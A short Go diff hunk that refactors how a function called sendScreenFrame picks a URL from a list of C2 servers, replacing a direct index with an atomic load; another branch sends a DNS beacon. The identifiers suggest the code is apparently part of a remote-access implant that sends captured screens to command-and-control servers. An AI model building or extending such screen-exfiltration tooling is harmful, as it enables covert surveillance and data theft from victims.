@@ -34,7 +34,7 @@ func sendScreenFrame(data []byte) {
 	case "dns":
 		sendDNSBeacon(sendBody)
 	default:
-		screenURL := C2URLs[currentC2Idx]
+		screenURL := c2URLAtIndex(int(currentC2Idx.Load()))
 		if !strings.HasPrefix(screenURL, "http://") && !strings.HasPrefix(screenURL, "https://") {
 			screenURL = "http://" + screenURL
 		}
